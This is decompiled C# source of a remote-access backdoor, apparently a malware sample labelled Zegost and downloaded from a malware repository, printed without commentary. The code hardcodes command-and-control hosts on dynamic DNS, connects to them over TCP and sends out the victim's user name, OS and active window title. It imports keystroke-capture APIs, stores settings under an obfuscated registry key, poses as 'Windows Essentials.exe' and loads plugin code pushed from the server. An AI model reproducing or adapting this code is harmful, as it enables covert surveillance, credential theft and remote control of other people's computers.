// Decompiled with JetBrains decompiler
// Type: S400.Functions
// Assembly: Client, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E238969-7352-439B-AF4B-F16FB5D78EB5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Zegost.gen-c50b14be52addaac071e25ca25c9249cd97eef4556b93db74f6aba00b8202b8a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace S400
{
  public class Functions
  {
    public static readonly List<string> H = new List<string>((IEnumerable<string>) new string[2]
    {
      "dnets.ddns.net",
      "znets.ddns.net"
    });
    public static readonly List<string> P = new List<string>((IEnumerable<string>) new string[2]
    {
      Conversions.ToString(5356),
      Conversions.ToString(5356)
    });
    public static readonly string name = "Q2xpZW50";
    public static readonly string Folder = "Windows Explorer";
    public static readonly string payload = "Windows Essentials.exe";
    public static readonly string Diry = "ProgramData";
    public static readonly string rn = "MZQ5ffWQ";
    public static readonly string Y = "|S400|";
    public static readonly string x1 = Program.F.Info.OSFullName.Replace(Strings.StrReverse("tfosorciM"), "").Replace(Strings.StrReverse("swodniW"), Strings.StrReverse("niW")).Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(Strings.StrReverse("niW "), Strings.StrReverse("niW"));
    public static readonly string DIR = Interaction.Environ(Functions.Diry) + "\\" + Functions.Folder;
    public static readonly string str = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetKeyboardLayout(int dwLayout);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    public static extern int ToUnicodeEx(
      uint wVirtKey,
      uint wScanCode,
      byte[] lpKeyState,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pwszBuff,
      int cchBuff,
      uint wFlags,
      IntPtr dwhkl);

    [DllImport("user32.dll")]
    public static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    public static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetVolumeInformation(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer,
      int nVolumeNameSize,
      ref int lpVolumeSerialNumber,
      ref int lpMaximumComponentLength,
      ref int lpFileSystemFlags,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer,
      int nFileSystemNameSize);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowTextLength(long hwnd);

    [DllImport("kernel32.dll")]
    public static extern bool DLL(string dllToLoad);

    public static string ENB(ref string s) => Convert.ToBase64String(Functions.SB(ref s));

    public static object Gc(string n, object ret)
    {
      object objectValue;
      try
      {
        objectValue = RuntimeHelpers.GetObjectValue(Program.F.Registry.CurrentUser.OpenSubKey(Strings.StrReverse("\\erawtfoS") + Functions.rn).GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret)))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        objectValue = RuntimeHelpers.GetObjectValue(ret);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return objectValue;
    }

    public static bool ct()
    {
      Program.Cn = false;
      Thread.Sleep(2000);
      FileInfo lo = Program.LO;
      lock (lo)
      {
        try
        {
          if (Program.C != null)
          {
            try
            {
              Program.C.Close();
              Program.C = (TcpClient) null;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
          try
          {
            Program.MeM.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        Program.hh = Functions.H[new Random().Next(0, Functions.H.Count)];
        Program.pp = Functions.P[new Random().Next(0, Functions.P.Count)];
        try
        {
          Program.MeM = new MemoryStream();
          Program.C = new TcpClient();
          Program.C.ReceiveBufferSize = 810000;
          Program.C.SendBufferSize = 810000;
          Program.C.Client.SendTimeout = -1;
          Program.C.Client.ReceiveTimeout = -1;
          Program.C.Connect(Program.hh, Conversions.ToInteger(Program.pp));
          Program.Cn = true;
          Functions.Send("FCC");
          if (File.Exists(Program.Xml + "\\FD.ini"))
          {
            try
            {
              Functions.Send(File.ReadAllText(Program.Xml + "\\FD.ini").Replace("fC4kOnw=", Functions.name));
              string[] strArray1 = new string[7];
              strArray1[0] = "inf";
              strArray1[1] = Functions.Y;
              string[] strArray2 = strArray1;
              string userName = Environment.UserName;
              string str1 = Functions.ENB(ref userName);
              strArray2[2] = str1;
              strArray1[3] = Functions.Y;
              string[] strArray3 = strArray1;
              string x1 = Functions.x1;
              string str2 = Functions.ENB(ref x1);
              strArray3[4] = str2;
              strArray1[5] = Functions.Y;
              string[] strArray4 = strArray1;
              string s = lo.LastWriteTime.Date.ToString("yy-MM-dd");
              string str3 = Functions.ENB(ref s);
              strArray4[6] = str3;
              Functions.Send(string.Concat(strArray1));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          Program.Cn = false;
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      return Program.Cn;
    }

    public static byte[] SB(ref string S) => Encoding.UTF8.GetBytes(S);

    public static bool Send(string S) => Functions.Sendb(Functions.SB(ref S));

    public static bool Sendb(byte[] b)
    {
      if (!Program.Cn)
        return false;
      try
      {
        lock (Program.LO)
        {
          if (!Program.Cn)
            return false;
          MemoryStream memoryStream = new MemoryStream();
          string S = b.Length.ToString() + "\0";
          byte[] buffer = Functions.SB(ref S);
          memoryStream.Write(buffer, 0, buffer.Length);
          memoryStream.Write(b, 0, b.Length);
          Program.C.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        ProjectData.SetProjectError(ex1);
        try
        {
          if (Program.Cn)
          {
            Program.Cn = false;
            Program.C.Close();
          }
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return Program.Cn;
    }

    public static bool TV(string n, object t, RegistryValueKind typ)
    {
      bool flag;
      try
      {
        Program.F.Registry.CurrentUser.CreateSubKey(Strings.StrReverse("\\erawtfoS") + Functions.rn).SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t))), typ);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static byte[] ZIP(byte[] B)
    {
      MemoryStream memoryStream = new MemoryStream(B);
      GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
      byte[] buffer = new byte[4];
      memoryStream.Position = checked (memoryStream.Length - 5L);
      memoryStream.Read(buffer, 0, 4);
      int int32 = BitConverter.ToInt32(buffer, 0);
      memoryStream.Position = 0L;
      byte[] array = new byte[checked (int32 - 1 + 1 - 1 + 1)];
      gzipStream.Read(array, 0, int32);
      gzipStream.Dispose();
      memoryStream.Dispose();
      return array;
    }

    public static string ACT()
    {
      string str1;
      try
      {
        IntPtr foregroundWindow = Functions.GetForegroundWindow();
        if (foregroundWindow == IntPtr.Zero)
          return "";
        string str2 = Strings.Space(checked (Functions.GetWindowTextLength((long) foregroundWindow) + 1));
        Functions.GetWindowText(foregroundWindow, ref str2, str2.Length);
        str1 = Functions.ENB(ref str2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str1 = "";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public static string BS(ref byte[] B) => Encoding.UTF8.GetString(B);

    public static object Plugin(byte[] b, string c)
    {
      Module[] modules = Assembly.Load(b).GetModules();
      int index1 = 0;
      while (index1 < modules.Length)
      {
        Module module = modules[index1];
        Type[] types = module.GetTypes();
        int index2 = 0;
        while (index2 < types.Length)
        {
          Type type = types[index2];
          if (type.FullName.EndsWith("." + c))
            return module.Assembly.CreateInstance(type.FullName);
          checked { ++index2; }
        }
        checked { ++index1; }
      }
      return (object) null;
    }

    public static string md5(byte[] B)
    {
      B = new MD5CryptoServiceProvider().ComputeHash(B);
      string str = "";
      byte[] numArray = B;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        str += num.ToString("x2");
        checked { ++index; }
      }
      return str;
    }
  }
}
